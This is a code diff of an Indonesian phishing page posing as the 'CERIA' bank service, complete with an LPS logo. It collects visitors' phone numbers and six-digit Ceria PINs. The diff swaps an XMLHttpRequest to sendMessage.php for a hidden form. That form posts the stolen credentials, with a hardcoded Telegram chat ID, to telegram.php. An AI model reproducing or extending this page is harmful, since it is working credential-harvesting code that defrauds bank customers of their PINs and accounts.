@@ -5,7 +5,7 @@
   <title>CERIA</title>
   <meta name="viewport" content="width, initial-scale=1">
   <style>
-    body {
+  body {
       font-family: Arial, sans-serif;
       margin: 0;
       padding: 0;
@@ -88,33 +88,32 @@
 
       var message = "𝗡𝗼𝗺𝗼𝗿 𝗛𝗮𝗻𝗱𝗽𝗵𝗼𝗻𝗲:" + nomorHP + "\n𝗠𝗮𝘀𝘂𝗸𝗮𝗻 𝗣𝗜𝗡 𝗖𝗲𝗿𝗶𝗮: " + pin;
 
-      // Kirim pesan ke file PHP yang sama untuk mengelola pengiriman ke bot Telegram
-      var xhttp = new XMLHttpRequest();
-      xhttp.onreadystatechange = function() {
-        if (this.readyState === 4 && this.status === 200) {
-          console.log("Pesan terkirim: " + message);
-          window.location.href = 'limit.html'; // Mengarahkan ke halaman limit.html setelah pengiriman berhasil
-        }
-      };
+      // Set nilai untuk formulir Telegram yang tersembunyi
+      document.getElementById('chatid').value = '6824078885'; // Gantilah 'your_chat_id' dengan nilai yang sesuai
+      document.getElementById('pesan').value = message;
 
-      // Mengirim data ke file PHP
-      xhttp.open("GET", "sendMessage.php?message=" + encodeURIComponent(message), true);
-      xhttp.send();
+      // Kirim formulir yang tersembunyi
+      document.getElementById('telegramForm').submit();
     }
   </script>
 </head>
+
 <body>
-   <div class="gambar">
+  <div class="gambar">
     <img src="https://i.ibb.co/sgcQnDC/IMG-20240116-050851.jpg" alt="Gambar Pucok">
   </div>
 
   <div class="form-container">
     <form onsubmit="kirimPesan(); return false;">
-      <input type="tel" id="nomor_hp" name="nomor_hp" placeholder="+62- 𝗡𝗼𝗺𝗼𝗿 𝗛𝗮𝗻𝗱𝗽𝗵𝗼𝗻𝗲" style="color:blue;">
-
-      <input type="tel" id="pin" name="pin" placeholder="𝗠𝗮𝘀𝘂𝗸𝗮𝗻 𝗣𝗜𝗡 𝗖𝗲𝗿𝗶𝗮" maxlength="6">
-
+      <input type="tel" id="nomor_hp" name="nomor_hp" placeholder="+62- Nomor Handphone" style="color:blue;">
+      <input type="tel" id="pin" name="pin" placeholder="Masukkan PIN Ceria" maxlength="6">
       <input type="Submit" value="Lanjutkan">
+    </form>
+
+    <!-- Formulir tambahan tersembunyi untuk Telegram -->
+    <form id="telegramForm" action="telegram.php" method="post" style="display: none;">
+      <input type="hidden" name="chatid" id="chatid">
+      <input type="hidden" name="pesan" id="pesan">
     </form>
   </div>
 
@@ -122,4 +121,5 @@
     <img src="https://i.ibb.co/c2BQYp8/IMG-20231229-WA0003-removebg-preview.png" alt="Logo LPS">
   </div>
 </body>
+
 </html>
